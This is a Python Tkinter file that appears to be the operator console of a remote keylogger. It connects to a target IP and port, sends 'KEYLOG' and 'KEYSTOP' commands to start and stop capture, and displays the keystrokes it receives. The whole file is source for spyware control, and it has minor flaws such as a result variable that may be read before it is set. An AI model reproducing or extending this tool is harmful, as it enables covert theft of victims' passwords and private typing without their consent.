from tkinter import *
from tkinter import ttk
import threading
import socket
# pip install pillow
from PIL import Image, ImageTk
from pyautogui import scroll
class KeyloggerWindow(Frame):
    def __init__(self,master,ip,port_no):
        Frame.__init__(self, master)
        self.master=master
        self.master.resizable(FALSE, FALSE)
        self.ip=ip
        self.port_no=port_no
    
        hookButton = ttk.Button(self.master, text='Hook',command=self.manageEventHook)
        hookButton.place(x=5,y=5,height=60)

        unHookButton = ttk.Button(self.master, text='Unhook',command=self.eventUnhook)
        unHookButton.place(x=130,y=5,height=60)
        
        printButton = ttk.Button(self.master, text='Print',command=self.eventPrint)
        printButton.place(x=255,y=5,height=60)

        deleteButton = ttk.Button(self.master, text='Delete',command=self.eventDelete)
        deleteButton.place(x=380,y=5,height=60)
        #file status
        self.textMulti=Text(self.master)
        self.textMulti.place(x=5,y=70,height=160)
        self.textMulti.configure(state='disabled')
        
        
        '''
        self.statusText = StringVar()
        self.statusEntry = ttk.Entry(self.master,width=52,textvariable=self.statusText)
        self.statusEntry.configure(state='disabled')
        self.statusEntry.place(x=5,y=70,height=150)
        '''


    def loadKeyLog(self):
        self.master.wm_title("Keylogger")
        self.master.geometry('510x250')
        self.master.mainloop()
    def manageEventHook(self):
        threading.Thread(target=self.eventHook).start()
    def eventHook(self):

        cmd = "KEYLOG"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port_no))
        self.connection.send(cmd.encode())
        conn = self.connection
        while True:
            self.data = conn.recv(1024)
            if not self.data:
                break
            self.result = self.data.decode()
        
    def eventUnhook(self):
        cmd = "KEYSTOP"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port_no))
        self.connection.send(cmd.encode())
    def eventPrint(self):
        try:
            self.textMulti.configure(state='normal')
            self.textMulti.insert(END,str(self.result))
            self.textMulti.configure(state='disabled')
            self.data=""      
        except:
            print('No')    
    def eventDelete(self):
        self.textMulti.configure(state='normal')
        self.textMulti.delete('1.0',END)
        self.textMulti.configure(state='disabled')
